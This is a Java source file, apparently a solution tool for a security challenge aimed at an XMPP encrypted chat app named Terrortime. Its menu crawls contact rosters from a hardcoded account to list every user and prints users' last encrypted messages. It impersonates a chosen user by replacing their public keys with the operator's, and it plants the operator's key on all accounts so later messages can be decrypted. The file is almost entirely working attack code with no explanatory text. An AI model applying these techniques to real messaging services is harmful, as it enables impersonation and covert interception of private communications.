package terrortimesol;

import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.util.Collection;
import java.util.InputMismatchException;
import java.util.LinkedList;
import java.util.Optional;
import java.util.Scanner;

import org.jivesoftware.smack.roster.Roster;
import org.jivesoftware.smack.roster.RosterEntry;

public class Main {

	public static LinkedList<String> getAllAccounts() throws InterruptedException {
		System.out.println("[*] Find all the accounts...");
		String username = "elias--vhost-1310";
		LinkedList<RosterEntry> allAccounts = new LinkedList<RosterEntry>();
		XmppClient xmppClient = null;
		Roster roster = null;

		int index = 0;
		LinkedList<String> usernameList = new LinkedList<String>();
		usernameList.add(username);

		do {
			username = usernameList.get(index);
			xmppClient = new XmppClient(username);
			roster = xmppClient.getRoster();

			Collection<RosterEntry> entries = null;
			int count = 0;
			int noEntries = 0;
			while (count < 3 || noEntries < 2) {
				if (roster != null) {
					entries = roster.getEntries();
					count++;
					noEntries = entries.size();
				}
				Thread.sleep(1000);
			}

			if (entries != null) {
				System.out.println("[+] Contact list of " + username);
				for (RosterEntry entry : entries) {
					String uname = entry.getJid().toString().split("@")[0];
					if (!usernameList.contains(uname)) {
						allAccounts.addLast(entry);
						usernameList.addLast(uname);
					}
					System.out.println("        " + entry);
				}
			}
			xmppClient.disconnect();
			index++;
			Thread.sleep(2000);
		} while (index < usernameList.size());

		return usernameList;
	}

	public static void printTheLastEncryptedMessage() {
		Scanner input = new Scanner(System.in);
		System.out.println("\n[*] Print the last encrypted message");
		System.out.print("[*] Please enter the username: ");
		String username = input.nextLine();
		XmppClient xmppClient = new XmppClient(username);
		xmppClient.printTheLastEncryptedMessage();
	}

	public static void masquerade() {
		Scanner input = new Scanner(System.in);
		System.out.println("\n[*] Who do you want to masquerade?");
		System.out.print("[*] Please enter the username: ");
		String username = input.nextLine();
		System.out.print("[*] Please enter your public key filename: ");
		String pubKeyFile = input.nextLine();
		XmppClient xmppClient = new XmppClient(username);
		String originalPubKeys = xmppClient.replacePublicKeysWith(pubKeyFile, true);
		if (originalPubKeys != "") {
			xmppClient.disconnect();
			System.out.println("[+] You have been masqueraded as " + username);
			System.out.println("[*] " + username + " CANNOT see your spoofed messages");
			System.out
					.println("[*] Please log in as " + username + " on the android emulator and send spoofed messages");
			String choice = "y";
			do {
				System.out.print("[*] Stop masquerading [Y/n]?");
				choice = input.nextLine();
			} while (choice == "n");
			xmppClient = new XmppClient(username);
			if (xmppClient.replacePublicKeysWith(originalPubKeys, false) != "") {
				System.out.println("[+] Masquerading is stop.");
			}
		} else {
			System.out.println("[-] Cannot masquerade");
		}
	}

	public static void addPublicKeyToAllAccounts() throws InterruptedException {
		Scanner input = new Scanner(System.in);
		System.out.print("[*] Please enter your public key filename: ");
		String pubKeyFile = input.nextLine();
		LinkedList<String> usernames = Main.getAllAccounts();
		for (String username : usernames) {
			XmppClient xmppClient = new XmppClient(username);
			xmppClient.addPublicKey(pubKeyFile);
			xmppClient.disconnect();
		}
		System.out.println("[+] You public key has been added to all Terrortime account.");
	}

	public static void exportAllPublicKeys() {
		Scanner input = new Scanner(System.in);
		System.out.print("[*] Please enter the username: ");
		String username = input.nextLine();
		XmppClient xmppClient = new XmppClient(username);
		xmppClient.exportAllPublicKeys();
	}


	public static int menu() {
		int selection = 0;
		Scanner input = new Scanner(System.in);

		System.out.println("\n\n[*] Menu");
		System.out.println("    1 - Print all accounts");
		System.out.println("    2 - Print the last encrypted message");
		System.out.println("    3 - Masquerade");
		System.out.println("    4 - Add your public key to all account for future decryption");
		System.out.println("    5 - Export all public keys to file");
		System.out.println("    0 - Exit");
		System.out.print("[*] Please enter your choices: ");

		do {
			try {
				selection = input.nextInt();
				if (selection < 0 || selection > 5) {
					System.out.println("[-] Invalid choice.");
					System.out.print("\n[*] Please choose again: ");
					selection = -1;
				}
			} catch (InputMismatchException e) {
				System.out.println("[-] Invalid choice.");
				System.out.print("\n[*] Please choose again: ");
				input.nextLine();
				selection = -1;
			}
		} while (selection < 0);
		return selection;
	}

	public static void main(String[] args) throws InterruptedException, Exception {
		int selection = 0;
		do {
			selection = Main.menu();
			switch (selection) {
			case 1:
				Main.getAllAccounts();
				break;
			case 2:
				Main.printTheLastEncryptedMessage();
				break;
			case 3:
				Main.masquerade();
				break;
			case 4:
				Main.addPublicKeyToAllAccounts();
				break;
			case 5:
				Main.exportAllPublicKeys();
				break;
			case 0:
				System.out.println("[*] Exit.");
				break;
			}
		} while (selection != 0);
	}

}
